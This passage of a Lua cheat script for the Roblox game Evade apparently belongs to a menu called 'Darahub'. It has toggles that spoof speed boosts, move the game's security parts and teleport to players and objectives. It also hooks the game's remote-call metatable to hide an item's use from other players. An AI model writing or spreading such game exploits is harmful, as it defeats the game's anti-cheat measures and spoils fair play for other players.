            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("Part") and string.find(obj.Name:lower(), "securitypart") and not table.find(storedSecurityParts, obj) then
                    table.insert(storedSecurityParts, obj)
                end
            end
            
            if #storedSecurityParts == 0 then
                WindUI:Notify({
                    Title = "Security Parts",
                    Content = "No security parts found",
                    Duration = 3
                })
                movingSecurityParts = false
                restoreInvisPartsCollision()
                return
            end
            
            for _, part in ipairs(storedSecurityParts) do
                for _, child in ipairs(part:GetChildren()) do
                    if child:IsA("BodyVelocity") or child:IsA("BodyGyro") or child:IsA("BodyForce") then
                        child:Destroy()
                    end
                end
                
                part.CanCollide = true
                part.Anchored = false
                part.Massless = false
                
                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.Velocity = Vector3.new(0, 0, 0)
                bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
                bodyVelocity.Parent = part
                
                local bodyGyro = Instance.new("BodyGyro")
                bodyGyro.MaxTorque = Vector3.new(4000, 4000, 4000)
                bodyGyro.P = 1000
                bodyGyro.D = 100
                bodyGyro.Parent = part
            end
            
            movementConnection = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
                if not movingSecurityParts or #storedSecurityParts == 0 then
                    if movementConnection then
                        movementConnection:Disconnect()
                        movementConnection = nil
                    end
                    return
                end
                
                local mainPart = storedSecurityParts[1]
                if mainPart and mainPart.Parent then
                    local time = tick()
                    local x = math.cos(time * partSpeed * 0.1) * partRadius
                    local z = math.sin(time * partSpeed * 0.1) * partRadius
                    local y = math.sin(time * partSpeed * 0.05) * 10 + 500
                    
                    mainPart.Position = Vector3.new(x - 29, y, z + 30)
                    
                    for i = 2, #storedSecurityParts do
                        local followerPart = storedSecurityParts[i]
                        if followerPart and followerPart.Parent then
                            local offsetX = (i - 1) * 5
                            local offsetZ = (i - 1) * 5
                            followerPart.Position = mainPart.Position + Vector3.new(offsetX, 0, offsetZ)
                        end
                    end
                else
                    movingSecurityParts = false
                end
            end)
        else
            restoreInvisPartsCollision()
            
            if movementConnection then
                movementConnection:Disconnect()
                movementConnection = nil
            end
            
            for _, part in ipairs(storedSecurityParts) do
                if part and part.Parent then
                    part.Anchored = true
                    part.Position = Vector3.new(0, 500, 0)
                    
                    for _, child in ipairs(part:GetChildren()) do
                        if child:IsA("BodyVelocity") or child:IsA("BodyGyro") or child:IsA("BodyForce") then
                            child:Destroy()
                        end
                    end
                end
            end
            storedSecurityParts = {}
        end
    end
})

local partSpeedInput = Tabs.Utility:Input({
    Title = "Part Speed",
    Flag = "partSpeedInput",
    Placeholder = "10",
    Value = tostring(partSpeed),
    NumbersOnly = true,
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 then
            partSpeed = speed
        end
    end
})

local partRadiusInput = Tabs.Utility:Input({
    Title = "Part Radius",
    Flag = "partRadiusInput",
    Placeholder = "100",
    Value = tostring(partRadius),
    NumbersOnly = true,
    Callback = function(value)
        local radius = tonumber(value)
        if radius and radius > 0 then
            partRadius = radius
        end
    end
})

local speedPadConnection = nil
local speedPadCharAddedConn = nil
local speedPadObjects = {}

if not featureStates.SpeedPadValue then
    featureStates.SpeedPadValue = 1.3
end
if not featureStates.SpeedPadDuration then
    featureStates.SpeedPadDuration = 2
end

local function cleanupSpeedPadObjects()
    for _, obj in pairs(speedPadObjects) do
        if obj.connection and obj.connection.Connected then
            obj.connection:Disconnect()
        end
    end
    speedPadObjects = {}
end

local function setupSpeedPadBooster()
    cleanupSpeedPadObjects()
    
    local function findSpeedPads()
        local pads = {}
        local deployables = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Deployables")
        if not deployables then return pads end
        
        for _, pad in ipairs(deployables:GetChildren()) do
            if string.find(pad.Name:lower(), "speed") then
                table.insert(pads, pad)
            end
        end
        return pads
    end

    local function createSpeedPadMonitor(pad)
        local padId = tostring(pad:GetDebugId())
        
        if speedPadObjects[padId] and speedPadObjects[padId].connection then
            speedPadObjects[padId].connection:Disconnect()
        end

        local connection = RunService.Heartbeat:Connect(function()
            if not pad or not pad.Parent then
                if connection.Connected then
                    connection:Disconnect()
                end
                speedPadObjects[padId] = nil
                return
            end

            local character = player.Character
            if not character then return end
            
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return end

            local padPosition = pad.PrimaryPart and pad.PrimaryPart.Position or pad:GetPivot().Position
            local distance = (humanoidRootPart.Position - padPosition).Magnitude
            
            if distance >= 1 and distance <= 9 then
                if not speedPadObjects[padId].lastBoost or (tick() - speedPadObjects[padId].lastBoost) > 1 then
                    pcall(function()
                        firesignal(ReplicatedStorage.Events.Character.SpeedBoost.OnClientEvent, "SpeedPad", featureStates.SpeedPadValue, featureStates.SpeedPadDuration, Color3.new(0.490196, 0.607843, 1.000000))
                    end)
                    speedPadObjects[padId].lastBoost = tick()
                end
            end
        end)

        speedPadObjects[padId] = {
            connection = connection,
            lastBoost = 0,
            pad = pad
        }
    end

    local deployables = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Deployables")
    if deployables then
        for _, pad in ipairs(findSpeedPads()) do
            createSpeedPadMonitor(pad)
        end
        
        if speedPadObjects.childAddedConn and speedPadObjects.childAddedConn.Connected then
            speedPadObjects.childAddedConn:Disconnect()
        end
        speedPadObjects.childAddedConn = deployables.ChildAdded:Connect(function(child)
            task.wait(0.5)
            if string.find(child.Name:lower(), "speed") then
                createSpeedPadMonitor(child)
            end
        end)
        
        if speedPadObjects.childRemovedConn and speedPadObjects.childRemovedConn.Connected then
            speedPadObjects.childRemovedConn:Disconnect()
        end
        speedPadObjects.childRemovedConn = deployables.ChildRemoved:Connect(function(child)
            local padId = tostring(child:GetDebugId())
            if speedPadObjects[padId] and speedPadObjects[padId].connection then
                speedPadObjects[padId].connection:Disconnect()
                speedPadObjects[padId] = nil
            end
        end)
    end
end

SpeedPadToggle = Tabs.Utility:Toggle({
    Title = "SpeedPad Booster",
    Flag = "SpeedPadToggle",
    Value = false,
    Callback = function(state)
        featureStates.SpeedPad = state
        if state then
            if not player.Character then
                player.CharacterAdded:Wait()
            end
            task.wait(1)
            setupSpeedPadBooster()
            
            if speedPadCharAddedConn then
                speedPadCharAddedConn:Disconnect()
            end
            speedPadCharAddedConn = player.CharacterAdded:Connect(function()
                task.wait(2)
                if featureStates.SpeedPad then
                    setupSpeedPadBooster()
                end
            end)
        else
            cleanupSpeedPadObjects()
            if speedPadCharAddedConn then
                speedPadCharAddedConn:Disconnect()
                speedPadCharAddedConn = nil
            end
        end
    end
})

SpeedPadValueInput = Tabs.Utility:Input({
    Title = "Speed Value",
    Flag = "SpeedPadValueInput",
    Placeholder = "1.3",
    Value = tostring(featureStates.SpeedPadValue),
    NumbersOnly = true,
    Callback = function(text)
        local num = tonumber(text)
        if num then
            featureStates.SpeedPadValue = num
        end
    end
})

SpeedPadDurationInput = Tabs.Utility:Input({
    Title = "Duration",
    Flag = "SpeedPadDurationInput",
    Placeholder = "2",
    Value = tostring(featureStates.SpeedPadDuration),
    NumbersOnly = true,
    Callback = function(text)
        local num = tonumber(text)
        if num then
            featureStates.SpeedPadDuration = num
        end
    end
})

local jumpPadConnection = nil
local jumpPadCharAddedConn = nil
local jumpPadObjects = {}

if not featureStates.JumpPadBooster then
    featureStates.JumpPadBooster = false
end
if not featureStates.JumpPadValue then
    featureStates.JumpPadValue = 0
end

local function cleanupJumpPadObjects()
    for _, obj in pairs(jumpPadObjects) do
        if obj.connection and obj.connection.Connected then
            obj.connection:Disconnect()
        end
    end
    jumpPadObjects = {}
    
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj.Name == "TempBouncePart" then
            obj:Destroy()
        end
    end
end

local function setupJumpPadBooster()
    cleanupJumpPadObjects()
    
    local character = player.Character
    if not character then return end
    
    local humanoid = character:FindFirstChild("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    
    local function findJumpPads()
        local pads = {}
        local deployables = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Deployables")
        if not deployables then return pads end
        
        for _, pad in ipairs(deployables:GetChildren()) do
            if string.find(pad.Name:lower(), "jump") then
                table.insert(pads, pad)
            end
        end
        return pads
    end

    local function createJumpPadMonitor(pad)
        local padId = tostring(pad:GetDebugId())
        
        if jumpPadObjects[padId] and jumpPadObjects[padId].connection then
            jumpPadObjects[padId].connection:Disconnect()
        end

        local connection = ReplicatedStorage.Events.Other.DeployableUsed.OnClientEvent:Connect(function(deployable, usedOnPlayerModel)
            if deployable ~= pad then return end
            if not usedOnPlayerModel or not usedOnPlayerModel.Parent then return end
            if usedOnPlayerModel.Name ~= player.Name then return end
            if usedOnPlayerModel.Parent ~= workspace.Game.Players then return end

            local currentCharacter = player.Character
            if not currentCharacter then return end
            
            local currentHumanoid = currentCharacter:FindFirstChild("Humanoid")
            local currentRootPart = currentCharacter:FindFirstChild("HumanoidRootPart")
            if not currentHumanoid or not currentRootPart then return end

            currentRootPart.Velocity = Vector3.new(0, featureStates.JumpPadValue, 0)
            currentHumanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end)

        jumpPadObjects[padId] = {
            connection = connection,
            pad = pad
        }
    end

    local deployables = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Deployables")
    if deployables then
        for _, pad in ipairs(findJumpPads()) do
            createJumpPadMonitor(pad)
        end
        
        if jumpPadObjects.childAddedConn and jumpPadObjects.childAddedConn.Connected then
            jumpPadObjects.childAddedConn:Disconnect()
        end
        jumpPadObjects.childAddedConn = deployables.ChildAdded:Connect(function(child)
            task.wait(0.5)
            if string.find(child.Name:lower(), "jump") then
                createJumpPadMonitor(child)
            end
        end)
        
        if jumpPadObjects.childRemovedConn and jumpPadObjects.childRemovedConn.Connected then
            jumpPadObjects.childRemovedConn:Disconnect()
        end
        jumpPadObjects.childRemovedConn = deployables.ChildRemoved:Connect(function(child)
            local padId = tostring(child:GetDebugId())
            if jumpPadObjects[padId] and jumpPadObjects[padId].connection then
                jumpPadObjects[padId].connection:Disconnect()
                jumpPadObjects[padId] = nil
            end
        end)
    end
end

JumpPadToggle = Tabs.Utility:Toggle({
    Title = "Jump Pad Booster",
    Flag = "JumpPadToggle",
    Value = false,
    Callback = function(state)
        featureStates.JumpPadBooster = state
        if state then
            if not player.Character then
                player.CharacterAdded:Wait()
            end
            task.wait(1)
            setupJumpPadBooster()

            if jumpPadCharAddedConn then
                jumpPadCharAddedConn:Disconnect()
            end
            jumpPadCharAddedConn = player.CharacterAdded:Connect(function()
                task.wait(2)
                if featureStates.JumpPadBooster then
                    setupJumpPadBooster()
                end
            end)

            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoid and rootPart and humanoid.FloorMaterial == Enum.Material.Air then
                    local tempPart = Instance.new("Part")
                    tempPart.Name = "TempBouncePart"
                    tempPart.Size = Vector3.new(10, 1, 10)
                    tempPart.Position = rootPart.Position - Vector3.new(0, 3, 0)
                    tempPart.Anchored = true
                    tempPart.CanCollide = true
                    tempPart.Transparency = 1
                    tempPart.Parent = workspace

                    rootPart.Velocity = Vector3.new(0, featureStates.JumpPadValue, 0)
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)

                    game:GetService("Debris"):AddItem(tempPart, 1)
                end
            end
        else
            cleanupJumpPadObjects()
            if jumpPadCharAddedConn then
                jumpPadCharAddedConn:Disconnect()
                jumpPadCharAddedConn = nil
            end
        end
    end
})

JumpPadValueInput = Tabs.Utility:Input({
    Title = "Jump Value",
    Flag = "JumpPadValueInput",
    Placeholder = "0",
    Value = tostring(featureStates.JumpPadValue),
    NumbersOnly = true,
    Callback = function(text)
        local num = tonumber(text)
        if num then
            featureStates.JumpPadValue = num
        end
    end
})

UnlimitedColaToggle = Tabs.Utility:Toggle({
    Title = "Unlimited Cola",
    Flag = "UnlimitedColaToggle",
    Desc = "Block The ''ToolAction:FireServer'' remote when the value is ''(0, 19)'' This feature is a visual So no one can see you drink, Have fun of trick your viewer",
    Value = false,
    Callback = function(state)
        featureStates.UnlimitedCola = state
        
        if state then
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local RemoteEvent = ReplicatedStorage.Events.Character.ToolAction

            local mt = getrawmetatable(RemoteEvent)
            local oldNamecall = mt.__namecall

            local recentBlockTime = 0
            local blockCooldown = 0.1

            setreadonly(mt, false)

            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                local args = {...}
                
                if method == "FireServer" and args[2] == 19 then
                    local currentTime = tick()
                    
                    if currentTime - recentBlockTime >= blockCooldown then
                        recentBlockTime = currentTime
                        return nil
                    end
                end
                
                return oldNamecall(self, ...)
            end)

            setreadonly(mt, true)

            featureStates.ColaMetatableHook = {
                mt = mt,
                oldNamecall = oldNamecall
            }

            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local events = player.PlayerScripts.Events.temporary_events

            featureStates.ColaEventConnection = events.UseKeybind.Event:Connect(function(args)
                if args.Forced and args.Key == "Cola" and args.Down then
                    wait(2.15)
                    firesignal(game:GetService("ReplicatedStorage").Events.Character.SpeedBoost.OnClientEvent, "Cola", 1.4, 3.5, Color3.fromRGB(199, 141, 93))
                end
            end)

        else
            if featureStates.ColaMetatableHook then
                local mt = featureStates.ColaMetatableHook.mt
                local oldNamecall = featureStates.ColaMetatableHook.oldNamecall
                
                setreadonly(mt, false)
                mt.__namecall = oldNamecall
                setreadonly(mt, true)
                
                featureStates.ColaMetatableHook = nil
            end
            
            if featureStates.ColaEventConnection then
                featureStates.ColaEventConnection:Disconnect()
                featureStates.ColaEventConnection = nil
            end
        end
    end
})

ColaSpeedBoosterToggle = Tabs.Utility:Toggle({
    Title = "Cola Speed Booster",
    Flag = "ColaSpeedBoosterToggle",
    Value = false,
    Callback = function(state)
        featureStates.ColaSpeedBooster = state
        
        if state then
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local events = player.PlayerScripts.Events.temporary_events

            featureStates.ColaSpeedEventConnection = events.UseKeybind.Event:Connect(function(args)
                if args.Forced and args.Key == "Cola" and args.Down then
                    wait(2.14)
                    
                    local speed = featureStates.ColaSpeedValue or 1.4
                    local duration = featureStates.ColaDurationValue or 3.5
                    
                    firesignal(game:GetService("ReplicatedStorage").Events.Character.SpeedBoost.OnClientEvent, "Cola", speed, duration, Color3.fromRGB(199, 141, 93))
                end
            end)

        else
            if featureStates.ColaSpeedEventConnection then
                featureStates.ColaSpeedEventConnection:Disconnect()
                featureStates.ColaSpeedEventConnection = nil
            end
        end
    end
})

ColaSpeedInput = Tabs.Utility:Input({
    Title = "Speed Value",
    Flag = "ColaSpeedInput",
    Placeholder = "1.4",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num and num > 0 then
            featureStates.ColaSpeedValue = num
        end
    end
})

ColaDurationInput = Tabs.Utility:Input({
    Title = "Duration",
    Flag = "ColaDurationInput",
    Placeholder = "3.5",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num and num > 0 then
            featureStates.ColaDurationValue = num
        end
    end
})

local function handleRespawn()
    task.wait(2)
    
    if featureStates.SpeedPad then
        setupSpeedPadBooster()
    end
    
    if featureStates.JumpPadBooster then
        setupJumpPadBooster()
    end
end

player.CharacterAdded:Connect(handleRespawn)

task.spawn(function()
    task.wait(3)
    if featureStates.SpeedPad then
        setupSpeedPadBooster()
    end
    if featureStates.JumpPadBooster then
        setupJumpPadBooster()
    end
end)
-- teleports tab
Tabs.Teleport:Section({ Title = "Teleports", TextSize = 20 })
Tabs.Teleport:Divider()

Tabs.Teleport:Button({
    Title = "Teleport to Spawn",
    Desc = "Teleport to a random spawn location",
    Icon = "home",
    Callback = function()
        local spawnsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Map") and workspace.Game.Map:FindFirstChild("Parts") and workspace.Game.Map.Parts:FindFirstChild("Spawns")
        
        if spawnsFolder then
            local spawnLocations = spawnsFolder:GetChildren()
            if #spawnLocations > 0 then
                local randomSpawn = spawnLocations[math.random(1, #spawnLocations)]
                local character = player.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    humanoidRootPart.CFrame = randomSpawn.CFrame + Vector3.new(0, 3, 0)
                end
            end
        end
    end
})

Tabs.Teleport:Button({
    Title = "Teleport to Random Player",
    Desc = "Teleport to a random online player",
    Icon = "users",
    Callback = function()
        local players = Players:GetPlayers()
        local validPlayers = {}
        
        for _, plr in ipairs(players) do
            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(validPlayers, plr)
            end
        end
        
        if #validPlayers > 0 then
            local randomPlayer = validPlayers[math.random(1, #validPlayers)]
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if humanoidRootPart then
                humanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
})

Tabs.Teleport:Button({
    Title = "Teleport to Downed Player",
    Desc = "Teleport to a random downed player",
    Icon = "heart",
    Callback = function()
        local playersFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
        local downedPlayers = {}
        
        if playersFolder then
            for _, model in ipairs(playersFolder:GetChildren()) do
                if model:IsA("Model") and model:GetAttribute("Downed") == true and model.Name ~= player.Name then
                    local hrp = model:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        table.insert(downedPlayers, model)
                    end
                end
            end
        end
        
        if #downedPlayers > 0 then
            local randomDowned = downedPlayers[math.random(1, #downedPlayers)]
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if humanoidRootPart then
                humanoidRootPart.CFrame = randomDowned.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
})

local playerList = {}
PlayerDropdown = Tabs.Teleport:Dropdown({
    Title = "Select Player",
    Flag = "PlayerDropdown",
    Values = {"No players found"},
    Value = "No players found",
    Callback = function(selectedPlayer)
    end
})

local function updatePlayerList()
    playerList = {}
    local players = Players:GetPlayers()
    local playerNames = {}
    
    for _, plr in ipairs(players) do
        if plr ~= player then
            table.insert(playerList, plr)
            table.insert(playerNames, plr.Name)
        end
    end
    
    if #playerNames == 0 then
        playerNames = {"No players found"}
    end
    
    PlayerDropdown:Refresh(playerNames, true)
end

updatePlayerList()
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

Tabs.Teleport:Button({
    Title = "Teleport to Selected Player",
    Desc = "Teleport to the player selected in dropdown",
    Icon = "user",
    Callback = function()
        local selectedPlayerName = PlayerDropdown.Value
        if selectedPlayerName ~= "No players found" then
            for _, plr in ipairs(playerList) do
                if plr.Name == selectedPlayerName and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local character = player.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    
                    if humanoidRootPart then
                        humanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                    end
                    break
                end
            end
        end
    end
})

Tabs.Teleport:Button({
    Title = "Teleport to Ticket",
    Desc = "Teleport to a random ticket",
    Icon = "ticket",
    Callback = function()
        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        
        if tickets then
            local ticketList = tickets:GetChildren()
            if #ticketList > 0 then
                local randomTicket = ticketList[math.random(1, #ticketList)]
                local ticketPart = randomTicket:FindFirstChild("HumanoidRootPart")
                
                if ticketPart then
                    local character = player.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    
                    if humanoidRootPart then
                        humanoidRootPart.CFrame = ticketPart.CFrame + Vector3.new(0, 3, 0)
                    end
                end
            end
        end
    end
})

Tabs.Teleport:Button({
    Title = "Teleport to Nextbot",
    Desc = "Teleport to a random nextbot",
    Icon = "ghost",
    Callback = function()
        local nextbots = {}
        
        local playersFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
        if playersFolder then
            for _, model in ipairs(playersFolder:GetChildren()) do
                if model:IsA("Model") and isNextbotModel(model) then
                    local hrp = model:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        table.insert(nextbots, model)
                    end
                end
            end
        end
        
        local npcsFolder = workspace:FindFirstChild("NPCs")
        if npcsFolder then
            for _, model in ipairs(npcsFolder:GetChildren()) do
                if model:IsA("Model") and isNextbotModel(model) then
                    local hrp = model:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        table.insert(nextbots, model)
                    end
                end
            end
        end
        
        if #nextbots > 0 then
            local randomNextbot = nextbots[math.random(1, #nextbots)]
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if humanoidRootPart then
                humanoidRootPart.CFrame = randomNextbot.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
            end
        end
    end
})

Tabs.Teleport:Button({
    Title = "Teleport to SecurityPart",
    Icon = "shield",
    Callback = function()
        local existingPart = workspace:FindFirstChild("SecurityPart")
        
        if existingPart then
            local character = game.Players.LocalPlayer.Character
            
            if character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    humanoidRootPart.CFrame = existingPart.CFrame + Vector3.new(0, 3, 0)
                end
            end
        else
            print("SecurityPart not found")
        end
    end
})
local objectives = {}
local objectiveDropdown
local teleportButton
local refreshButton

local function findObjectives()
    objectives = {}
    
    local gameFolder = workspace:FindFirstChild("Game")
    if not gameFolder then return false end
    
    local mapFolder = gameFolder:FindFirstChild("Map")
    if not mapFolder then return false end
    
    local partsFolder = mapFolder:FindFirstChild("Parts")
    if not partsFolder then return false end
    
    local objectivesFolder = partsFolder:FindFirstChild("Objectives")
    if not objectivesFolder then return false end
    
    for _, obj in pairs(objectivesFolder:GetChildren()) do
        if obj:IsA("Model") then
            local primaryPart = obj.PrimaryPart
            if not primaryPart then
                for _, part in pairs(obj:GetChildren()) do
                    if part:IsA("BasePart") then
                        primaryPart = part
                        break
                    end
                end
            end
            
            if primaryPart then
                table.insert(objectives, {
                    Name = obj.Name,
                    Part = primaryPart,
                    Position = primaryPart.Position,
                    Size = primaryPart.Size
                })
            end
        end
    end
    
    return #objectives > 0
end

local function updateObjectiveDropdown()
    local hasObjectives = findObjectives()
    
    if not objectiveDropdown then
        warn("Objective dropdown not found in updateObjectiveDropdown")
        return
    end
    
    if hasObjectives and objectives then
        local objectiveNames = {}
        for _, obj in ipairs(objectives) do
            if obj and obj.Name then
                table.insert(objectiveNames, obj.Name)
            end
        end
        
        if #objectiveNames > 0 then
            objectiveDropdown:Refresh(objectiveNames, objectiveNames[1])
        else
            objectiveDropdown:Refresh({"No valid objectives"}, "No valid objectives")
        end
    else
        objectiveDropdown:Refresh({"No objectives found"}, "No objectives found")
    end
end

objectiveDropdown = Tabs.Teleport:Dropdown({
    Title = "Select Objective",
    Flag = "objectiveDropdown",
    Values = {"Loading..."},
    Value = "Loading...",
    Enabled = false,
    Callback = function(value)
    end
})

teleportButton = Tabs.Teleport:Button({
    Title = "Teleport to Objective",
    Icon = "navigation",
    Enabled = false,
    Callback = function()
        local selectedName = objectiveDropdown.Value
        if selectedName == "No objectives found" or selectedName == "Loading..." then
            return
        end
        
        local selectedObjective
        for _, obj in ipairs(objectives) do
            if obj.Name == selectedName then
                selectedObjective = obj
                break
            end
        end
        
        if not selectedObjective then
            return
        end
        
        local character = player.Character
        if not character then return end
        
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then return end
        
        local teleportPosition = selectedObjective.Position + Vector3.new(0, 5, 0)
        
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = {character}
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        
        local ray = workspace:Raycast(teleportPosition, Vector3.new(0, -10, 0), raycastParams)
        if ray then
            teleportPosition = ray.Position + Vector3.new(0, 3, 0)
        end
        
        humanoidRootPart.CFrame = CFrame.new(teleportPosition)
    end
})

refreshButton = Tabs.Teleport:Button({
    Title = "Refresh Objectives",
    Icon = "refresh-cw",
    Callback = function()
        updateObjectiveDropdown()
    end
})
task.spawn(function()
    task.wait(3)
    updateObjectiveDropdown()
    
    if workspace:FindFirstChild("Game") then
        local gameFolder = workspace.Game
        
        if gameFolder:FindFirstChild("Stats") then
            gameFolder.Stats:GetAttributeChangedSignal("RoundStarted"):Connect(function()
                task.wait(2)
                updateObjectiveDropdown()
            end)
        end
    end
end)
    -- Settings Tab
    Tabs.Settings:Section({ Title = "Settings", TextSize = 40 })
Tabs.Settings:Section({ Title = "Config Manager", TextSize = 20 })
Tabs.Settings:Divider()

-- Services
local ConfigManager = Window.ConfigManager
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local CurrentConfigName = "default"
local AutoLoadConfig = "default"
local AutoLoadEnabled = false
local AutoSaveEnabled = false
local ConfigListDropdown = nil
local AutoSaveConnection = nil

local function FileExists(path)
    if isfile then
        return pcall(readfile, path)
    end
    return false
end

local function WriteFile(path, content)
    if writefile then
        return pcall(writefile, path, content)
    end
    return false
end

local function ReadFile(path)
    if readfile then
        local success, content = pcall(readfile, path)
        if success then
            return content
        end
    end
    return ""
end

local function loadAutoLoadSettings()
    local autoLoadFile = "Darahub/AutoLoad/Game/Evade/AutoLoad.json"
    
    if FileExists(autoLoadFile) then
        local content = ReadFile(autoLoadFile)
        
        if content ~= "" then
            local success, data = pcall(function()
                return HttpService:JSONDecode(content)
            end)
            
            if success and data then
                AutoLoadConfig = data.configName or "default"
                AutoLoadEnabled = data.enabled or false
                return true
            end
        end
    end
    
    AutoLoadConfig = "default"
    AutoLoadEnabled = false
    return false
end

local function saveAutoLoadSettings()
    local autoLoadFile = "Darahub/AutoLoad/Game/Evade/AutoLoad.json"
    
    local success = WriteFile(autoLoadFile, "")
    if not success then
        if makefolder then
            pcall(function() makefolder("Darahub") end)
            pcall(function() makefolder("Darahub/AutoLoad") end)
            pcall(function() makefolder("Darahub/AutoLoad/Game") end)
            pcall(function() makefolder("Darahub/AutoLoad/Game/Evade") end)
        end
    end
    
    local data = {
        enabled = AutoLoadEnabled,
        configName = AutoLoadConfig
    }
    
    local success, json = pcall(function()
        return HttpService:JSONEncode(data)
    end)
    
    if success then
        WriteFile(autoLoadFile, json)
    end
end

loadAutoLoadSettings()

local ConfigNameInput = Tabs.Settings:Input({
    Title = "Config Name",
    Flag = "ConfigNameInput",
    Desc = "Name for your config file",
    Icon = "file-cog",
    Placeholder = "default",
    Value = CurrentConfigName,
    Callback = function(value)
        if value ~= "" then
            CurrentConfigName = value
        end
    end
})

Tabs.Settings:Space()

local AutoLoadToggle = Tabs.Settings:Toggle({
    Title = "Auto Load",
    Flag = "AutoLoadToggle",
    Desc = "Automatically load this config when script starts",
    Value = AutoLoadEnabled,
    Callback = function(state)
        AutoLoadEnabled = state
        if state then
            AutoLoadConfig = CurrentConfigName
            WindUI:Notify({
                Title = "Auto-Load",
                Content = "Config '" .. CurrentConfigName .. "' will load automatically on startup",
                Duration = 3
            })
        end
        saveAutoLoadSettings()
    end
})

local AutoSaveToggle = Tabs.Settings:Toggle({
    Title = "Auto Save",
    Flag = "AutoSaveToggle",
    Desc = "Automatically save changes to config every second",
    Value = AutoSaveEnabled,
    Callback = function(state)
        AutoSaveEnabled = state
        
        -- Stop existing auto-save loop if it exists
        if AutoSaveConnection then
            AutoSaveConnection:Disconnect()
            AutoSaveConnection = nil
        end
        
        if state then
            WindUI:Notify({
                Title = "Auto-Save",
                Content = "Config will save automatically every second",
                Duration = 2
            })
            
            -- Start auto-save loop
            AutoSaveConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if AutoSaveEnabled and CurrentConfigName ~= "" then
                    task.spawn(function()
                        Window.CurrentConfig = ConfigManager:Config(CurrentConfigName)
                        Window.CurrentConfig:Save()
                    end)
                end
                task.wait(1) -- Save every second
            end)
        else
            WindUI:Notify({
                Title = "Auto-Save",
                Content = "Auto-save disabled",
                Duration = 2
            })
        end
    end
})

Tabs.Settings:Space()

local function refreshConfigList()
    local allConfigs = ConfigManager:AllConfigs() or {}
    
    -- Ensure "default" config exists
    if not table.find(allConfigs, "default") then
        -- Create default config if it doesn't exist
        local defaultConfig = ConfigManager:Config("default")
        if defaultConfig and defaultConfig.Save then
            defaultConfig:Save()
        end
        table.insert(allConfigs, 1, "default")
    end
    
    table.sort(allConfigs, function(a, b)
        return a:lower() < b:lower()
    end)
    
    local defaultValue = table.find(allConfigs, CurrentConfigName) and CurrentConfigName or "default"
    
    if ConfigListDropdown and ConfigListDropdown.Refresh then
        ConfigListDropdown:Refresh(allConfigs, defaultValue)
    end
end

ConfigListDropdown = Tabs.Settings:Dropdown({
    Title = "Existing Configs",
    Flag = "ConfigListDropdown",
    Desc = "Select from saved configs",
    Values = {"default"},
    Value = "default",
    Callback = function(value)
        CurrentConfigName = value
        ConfigNameInput:Set(value)
        
        if AutoLoadEnabled then
            AutoLoadConfig = value
            saveAutoLoadSettings()
        end
        
        local config = ConfigManager:GetConfig(value)
        if config then
            WindUI:Notify({
                Title = "Config Selected",
                Content = "Config '" .. value .. "' selected",
                Duration = 2
            })
        end
    end
})

Tabs.Settings:Space()

local SaveConfigButton = Tabs.Settings:Button({
    Title = "Save Config",
    Desc = "Save current settings to config",
    Icon = "save",
    Callback = function()
        if CurrentConfigName == "" then
